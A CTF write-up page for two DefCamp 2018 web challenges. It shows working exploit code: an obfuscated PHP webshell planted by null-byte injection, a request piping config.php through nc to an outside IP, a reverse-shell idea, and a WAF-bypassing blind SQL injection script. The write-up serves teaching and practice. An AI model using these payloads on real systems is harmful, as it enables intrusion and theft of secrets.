@@ -1,0 +1,410 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>DefCamp CTF Finals 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#scribbles">scribbles</a>
+    
+                <a class="dropdown-item" href="#ticketcore">ticketcore</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#scribbles" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">scribbles</span>
+            </a>
+    
+<a href="#ticketcore" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">ticketcore</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="defcamp-ctf-finals-2018"><a class="header-link" href="#defcamp-ctf-finals-2018"></a>DefCamp CTF Finals 2018</h1>
+
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="scribbles"><a class="header-link" href="#scribbles"></a>Scribbles</h3>
+<p>(shw, bookgin, RB363, written by bookgin)</p>
+<p>Here is the server source code:</p>
+<pre class="hljs"><code> <span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">require</span>(<span class="hljs-string">'config.php'</span>);
+
+<span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>] !== <span class="hljs-string">'POST'</span>) {
+  highlight_file(<span class="hljs-keyword">__FILE__</span>);
+  <span class="hljs-keyword">exit</span>;
+}
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($_GET[<span class="hljs-string">'action'</span>])) {
+
+  $data = $_POST[<span class="hljs-string">'data'</span>];
+  $name = uniqid();
+
+  $payload = <span class="hljs-string">"data=$data&amp;name=$name"</span>;
+  $post = http_build_query([
+    <span class="hljs-string">'signature'</span> =&gt; hash_hmac(<span class="hljs-string">'md5'</span>, $payload, FLAG),
+    <span class="hljs-string">'payload'</span> =&gt; $payload,
+  ]);
+
+  $ch = curl_init();
+  curl_setopt($ch, CURLOPT_URL, <span class="hljs-string">"http://127.0.0.1"</span> . $_SERVER[<span class="hljs-string">'REQUEST_URI'</span>] . <span class="hljs-string">"?action=log"</span>);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
+  curl_setopt($ch, CURLOPT_POST, <span class="hljs-number">1</span>);
+  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+
+  <span class="hljs-keyword">echo</span> curl_exec($ch);
+
+} <span class="hljs-keyword">else</span> {
+
+  <span class="hljs-keyword">if</span> (hash_hmac(<span class="hljs-string">'md5'</span>, $_POST[<span class="hljs-string">'payload'</span>], FLAG) !== $_POST[<span class="hljs-string">'signature'</span>]) {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">'FAIL'</span>;
+    <span class="hljs-keyword">exit</span>;
+  }
+
+  parse_str($_POST[<span class="hljs-string">'payload'</span>], $payload);
+
+  $target = <span class="hljs-string">'files/'</span> . time() . <span class="hljs-string">'.'</span> . substr($payload[<span class="hljs-string">'name'</span>], <span class="hljs-number">-20</span>);
+  $contents = $payload[<span class="hljs-string">'data'</span>];
+  $decoded = base64_decode($contents);
+  $ext = <span class="hljs-string">'raw'</span>;
+
+  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($payload[<span class="hljs-string">'ext'</span>])) {
+    $ext = (
+      ( $payload[<span class="hljs-string">'ext'</span>] == <span class="hljs-string">'j'</span> ) ? <span class="hljs-string">'jpg'</span> :
+      ( $payload[<span class="hljs-string">'ext'</span>] == <span class="hljs-string">'p'</span> ) ? <span class="hljs-string">'php'</span> :
+      ( $payload[<span class="hljs-string">'ext'</span>] == <span class="hljs-string">'r'</span> ) ? <span class="hljs-string">'raw'</span> : <span class="hljs-string">'file'</span>
+    );
+  }
+
+  <span class="hljs-keyword">if</span> ($decoded !== <span class="hljs-string">''</span>) {
+    $contents = $decoded;
+    $target .= <span class="hljs-string">'.'</span> . $ext;
+  }
+
+  <span class="hljs-keyword">if</span> (strlen($contents) &gt; <span class="hljs-number">37</span>) {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">'FAIL'</span>;
+    <span class="hljs-keyword">exit</span>;
+  }
+
+  file_put_contents($target, $contents);
+
+  <span class="hljs-keyword">echo</span> <span class="hljs-string">'OK'</span>;
+}</code></pre><p>First let&#39;s try to overwrite <code>$name</code> by injecting data of this line <code>$payload = &quot;data=$data&amp;name=$name&quot;;</code></p>
+<pre class="hljs"><code>$data=<span class="hljs-string">"a&amp;name=sl0wp0ke.php\x00"</span>;</code></pre><p>Both uniqid() and time() are predicable, so we can infer the filename. After checking the content, we found that the null byte injection works because curl seems to truncate the data after a null byte.</p>
+<p>Than, intuitively, we should create a webshell by modifying the <code>ext</code> here:</p>
+<pre class="hljs"><code>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($payload[<span class="hljs-string">'ext'</span>])) {
+    $ext = (
+      ( $payload[<span class="hljs-string">'ext'</span>] == <span class="hljs-string">'j'</span> ) ? <span class="hljs-string">'jpg'</span> :
+      ( $payload[<span class="hljs-string">'ext'</span>] == <span class="hljs-string">'p'</span> ) ? <span class="hljs-string">'php'</span> :
+      ( $payload[<span class="hljs-string">'ext'</span>] == <span class="hljs-string">'r'</span> ) ? <span class="hljs-string">'raw'</span> : <span class="hljs-string">'file'</span>
+    );
+  }</code></pre><p>However this is a pitfall. Because of the precedence of operators, the tenary is <a href="https://stackoverflow.com/questions/5235632/stacking-multiple-ternary-operators-in-php">not working as expected</a>:</p>
+<pre class="hljs"><code>var_dump(<span class="hljs-keyword">true</span> ? <span class="hljs-string">'a'</span> : <span class="hljs-keyword">true</span> ? <span class="hljs-string">'b'</span> : <span class="hljs-string">'c'</span>); <span class="hljs-comment">// b</span>
+var_dump(<span class="hljs-keyword">true</span> ? <span class="hljs-string">'a'</span> : <span class="hljs-keyword">false</span> ? <span class="hljs-string">'b'</span> : <span class="hljs-string">'c'</span>); <span class="hljs-comment">// b</span>
+<span class="hljs-comment">// is exactly the same</span>
+var_dump((<span class="hljs-keyword">true</span> ? <span class="hljs-string">'a'</span> : <span class="hljs-keyword">false</span>) ? <span class="hljs-string">'b'</span> : <span class="hljs-string">'c'</span>); <span class="hljs-comment">// b</span></code></pre><p>But can we still create a file with extension <code>php</code>? Take a closer look of the lines below:</p>
+<pre class="hljs"><code>  $decoded = base64_decode($contents);
+   ...
+  <span class="hljs-keyword">if</span> ($decoded !== <span class="hljs-string">''</span>) {
+    $contents = $decoded;
+    $target .= <span class="hljs-string">'.'</span> . $ext;
+  }
+   ...
+  file_put_contents($target, $contents);</code></pre><p>If we can make <code>$decoded</code> empty, the filename will not be appended <code>$ext</code>! But how can we create a webshell with empty content? The trick is <code>base64_decode</code> will ignore invalid characters:</p>
+<pre class="hljs"><code>php &gt; var_dump(base64_decode(<span class="hljs-string">"W!V!V!Q"</span>));
+string(<span class="hljs-number">3</span>) <span class="hljs-string">"YUP"</span></code></pre><p>Now we can write any content without alphanumeric characters to a php file. However there is a constraint of the webshell : it should be less than 37 bytes. How do we bypass this?</p>
+<ol class="list">
+<li>short tag: The remote doesn&#39;t support short_tag <code>&lt;?</code>, but <a href="https://softwareengineering.stackexchange.com/questions/151661/is-it-bad-practice-to-use-tag-in-php">we can use <code>&lt;?=</code> instead</a>.</li>
+<li>PHP supports backtick to run shell command.</li>
+<li>To run arbitrary payload, we have to use <code>$_GET</code> to pass the parameter.</li>
+</ol>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?</span>=
+<span class="hljs-comment">// The content cannot contain null bytes so we use string concat</span>
+$_=_.(<span class="hljs-string">"\x18\x1a\x0b"</span>^___);  <span class="hljs-comment">// _GET</span>
+$_=$$_; <span class="hljs-comment">// now we have $_GET</span>
+`{$_[_]}`; <span class="hljs-comment">// `$_GET["_"]`</span></code></pre><p>The payload is 37 bytes. <a href="https://github.com/w181496/CTF/tree/master/dctf2018-final/Scribbles">kaibro from DoubleSigma</a> uses a cleverer NOT trick to print the <code>config.php</code>.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests
+s = requests.session()
+url = <span class="hljs-string">'https://scribbles.dctf18-finals.def.camp/'</span>
+r = s.post(url, data={<span class="hljs-string">'data'</span>: <span class="hljs-string">'&lt;?=$_=_.("\x18\x1a\x0b"^___);$_=$$_;`{$_[_]}`;&amp;name=sl0wp0ke.php\x00'</span>})
+print(r.text)
+s.get(<span class="hljs-string">'https://scribbles.dctf18-finals.def.camp/files/1541696874.sl0wp0ke.php?_=cat%20../config.php%20|%20nc%20240.240.240.240%2012345'</span>)</code></pre><p>Reference:</p>
+<ul class="list">
+<li><p><a href="https://balsn.tw/ctf_writeup/20180526-suctf/#getshell-(unsolved,-written-bookgin">my writeup in 2018 suctf</a>)</p>
+</li>
+<li><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">phithon&#39;s blog (Chinese)</a></p>
+</li>
+</ul>
+<h4 id="other-failed-attempts"><a class="header-link" href="#other-failed-attempts"></a>Other failed attempts</h4>
+<ul class="list">
+<li>retrieve <code>FLAG</code> of hash_hmac<ul class="list">
+<li>Although we can control the payload, we can&#39;t even get the signature. The request is sent to localhost.</li>
+</ul>
+</li>
+<li>SSRF in http_build_query<ul class="list">
+<li>Nope, the request is sent to localhost.</li>
+</ul>
+</li>
+<li>Using Unicode to bypass strlen check<ul class="list">
+<li>but <code>strlen(&quot;我&quot;) === 3</code> It will return the number of bytes.</li>
+</ul>
+</li>
+</ul>
+<h4 id="postscript"><a class="header-link" href="#postscript"></a>Postscript</h4>
+<p>The shortest payload I can think of is:</p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?</span>=`. ./?*=*`;</code></pre><p>First, we&#39;ll create a file <code>123456789.username=.raw</code> with a reverse shell payload. Then, we use this trick <code>. ./filename</code> to   use sh to interpret a plaintext file (refer to <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">phition&#39;s blog</a>). Also we represent the filaname using wildcard characters<code>?*=*</code>. The question mark is required. Otherwise the PHP will interpret the string as a comment.</p>
+<p>This payload may not work but I think it&#39;s worth to mention:)</p>
+<h3 id="ticketcore"><a class="header-link" href="#ticketcore"></a>TicketCore</h3>
+<p>(bookgin, sasdf, sces60107, written by bookgin)</p>
+<p>In the challenge we can retrieve ticket with this API:</p>
+<pre class="hljs"><code><span class="hljs-symbol">https:</span>//ticketcore.dctf18-finals<span class="hljs-meta">.def</span>.camp/printable-ticket/<span class="hljs-number">2006</span>
+<span class="hljs-symbol">https:</span>//ticketcore.dctf18-finals<span class="hljs-meta">.def</span>.camp/printable-ticket/<span class="hljs-number">2007</span></code></pre><p>Each ticket has a unique <code>code</code>.</p>
+<p>Let&#39;s do some fuzzing first:</p>
+<pre class="hljs"><code>/<span class="hljs-number">2006</span> <span class="hljs-comment">#get ticket 2006</span>
+/<span class="hljs-number">000002006.000</span> <span class="hljs-comment">#get tieckt 2006</span>
+/<span class="hljs-keyword">and</span> <span class="hljs-comment"># WAF</span>
+/drop <span class="hljs-comment"># WAF</span>
+/<span class="hljs-keyword">if</span> <span class="hljs-comment">#WAF</span>
+/' <span class="hljs-comment"># Server 500 Error</span>
+/'=' <span class="hljs-comment"># get ticket 2006</span>
+/<span class="hljs-number">1</span> <span class="hljs-comment">#This is a private VIP ticket that only real hackers have access to it!</span></code></pre><p>This is apparently a SQL injection challenge, and our main objective is to retrieve the ticket no.1. </p>
+<p><code>if</code>,<code>and</code>,<code>or</code> is WAFed, but we can still use <code>&amp;&amp;</code> <code>||</code> to execute blind SQL injection.</p>
+<pre class="hljs"><code><span class="hljs-comment"># get ticket 2006</span>
+/<span class="hljs-string">'='</span><span class="hljs-string">'&amp;&amp; '</span>hello=<span class="hljs-string">'hello'</span> <span class="hljs-params">||</span> <span class="hljs-string">'a'</span>=<span class="hljs-string">'
+# ticket not found
+/'</span>=<span class="hljs-string">''</span>&amp;&amp; <span class="hljs-string">'hello='</span>world<span class="hljs-string">' || '</span>a<span class="hljs-string">'='</span></code></pre><p>Let&#39;s try to extract the <code>code</code> of first ticket (The error message indicates that the column is named <code>code</code>) to see if it&#39;s the flag. The flag format is <code>DCTF{hex_digit}</code>.</p>
+<pre class="hljs"><code># <span class="hljs-keyword">return</span> first ticket
+/<span class="hljs-string">'='</span>'&amp;&amp; (<span class="hljs-keyword">select</span> code from tickets where id = <span class="hljs-number">1</span>)&gt;<span class="hljs-symbol">'DCT</span>' &amp;&amp; (<span class="hljs-keyword">select</span> code from tickets where id = <span class="hljs-number">1</span>)&lt;<span class="hljs-symbol">'DCU</span>'|| <span class="hljs-string">'a'</span>='</code></pre><p>Bingo, but unfortunately <code>DCTF</code> is WAFed. We have to find another way to represent the string.</p>
+<h4 id="solution-1"><a class="header-link" href="#solution-1"></a>Solution 1</h4>
+<p><code>0x</code> and most string function are WAFed. Eventually we use <code>0b00000001</code> to represent a string.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
+<span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b64</span><span class="hljs-params">(s)</span>:</span>
+    <span class="hljs-keyword">return</span> base64.b64encode(s.encode()).decode()
+
+s = requests.session()
+cookies ={
+<span class="hljs-comment"># omitted</span>
+}
+
+test = <span class="hljs-string">'https://ticketcore.dctf18-finals.def.camp/printable-ticket/'</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isCorrect</span><span class="hljs-params">(r)</span>:</span>
+    <span class="hljs-keyword">if</span> r.status_code != <span class="hljs-number">200</span>:
+        print(<span class="hljs-string">'syntax error'</span>)
+        <span class="hljs-keyword">return</span>  <span class="hljs-keyword">False</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-string">'WAF 1337 Alert!'</span> <span class="hljs-keyword">in</span> r.text:
+        print(<span class="hljs-string">'WAF'</span>)
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+    <span class="hljs-keyword">elif</span> <span class="hljs-string">'Hmm, the ticket code is empty or missing. Please contact support!'</span> <span class="hljs-keyword">in</span> r.text:
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isWAF</span><span class="hljs-params">(r)</span>:</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-string">'WAF 1337 Alert!'</span> <span class="hljs-keyword">in</span> r.text
+
+flag = <span class="hljs-string">'dctf{'</span>
+
+<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+    bingo = <span class="hljs-keyword">False</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">'}0123456789abcdef'</span>:
+        print(i)
+        larger_than = <span class="hljs-string">'0b'</span> + <span class="hljs-string">''</span>.join([<span class="hljs-string">'{:08b}'</span>.format(ord(j)) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> flag]) + <span class="hljs-string">'{:08b}'</span>.format(ord(i)) + <span class="hljs-string">'00000000'</span>
+        less_than = <span class="hljs-string">'0b'</span> + <span class="hljs-string">''</span>.join([<span class="hljs-string">'{:08b}'</span>.format(ord(j)) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> flag]) + <span class="hljs-string">'{:08b}'</span>.format(ord(i)) + <span class="hljs-string">'01011010'</span>
+        print(larger_than)
+        r = s.get(test + quote(f<span class="hljs-string">"'=''&amp;&amp; (select code from tickets where id = 1) &gt; {larger_than} &amp;&amp; (select code from tickets where id = 1) &lt; {less_than} || 'a'='"</span>), cookies=cookies)
+        <span class="hljs-keyword">if</span> isCorrect(r):
+            print(<span class="hljs-string">'bingo'</span>)
+            bingo = <span class="hljs-keyword">True</span>
+            flag += i
+            print(<span class="hljs-string">'flag'</span>, flag)
+            <span class="hljs-keyword">break</span>
+        <span class="hljs-keyword">else</span>:
+            print(<span class="hljs-string">'nope'</span>)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bingo:
+        print(<span class="hljs-string">'not found next char .....'</span>)
+        print(flag)
+        exit(<span class="hljs-number">0</span>)</code></pre><p>The string comparision in MYSQL is case insensitive, but since the flag is in hex digit format it&#39;s fine.</p>
+<p>Reference:</p>
+<ul class="list">
+<li><a href="https://spyclub.tech/2018/10/08/2018-10-08-inctf2018-web-challenge-writeup/">spyclub inctf 2018 writeup</a></li>
+</ul>
+<h4 id="solution-2"><a class="header-link" href="#solution-2"></a>Solution 2</h4>
+<p>It&#39;s worth to mention that the challenge filters all the <a href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html">string functions</a> and almost all <a href="https://dev.mysql.com/doc/refman/8.0/en/encryption-functions.html">crypto functions</a>. The only function we can use is <code>to_base64</code>. Thus another solution is to encoded the flag in base64 format and compare with the string. However because the base64-encoded flag contains <code>if</code> which is filtered, we have to encode the flag <strong>twice</strong> and perform the string comparison.</p>
+<p>Note that MySQL always perform case-insensitive comparison, so we&#39;ll lost the information of the case in base64. However fortunately since the flag is in hex digit, it not too hard to recover it.</p>
+<p>Another thing is that mysql base64-encoded string will contain a newline character if the output is more than 76 bytes. WTF...... (though the behavior is the same as the linux <code>base64</code>, who will expect a newline there.....)</p>
+<pre class="hljs"><code><span class="hljs-comment">// return 1</span>
+<span class="hljs-comment">// note substr index starts from 1</span>
+select substr(to_base64(<span class="hljs-string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span>),<span class="hljs-number">77</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">"<span class="hljs-subst">\n</span>"</span></code></pre><h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed attempts</h4>
+<ul class="list">
+<li>using other function to bypass WAF<ul class="list">
+<li>I write a simle script to try all string function of MySQL 8.0. All of them are filtered except to_base64.</li>
+</ul>
+</li>
+<li>using other statement to bypass WAF<ul class="list">
+<li>Yeah both <code>select</code> and <code>where</code> are not filterd. Maybe there are some useful statements which can be used to bypass WAF? But I don&#39;t think is possible because we want to manipulate the string itself.</li>
+</ul>
+</li>
+</ul>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
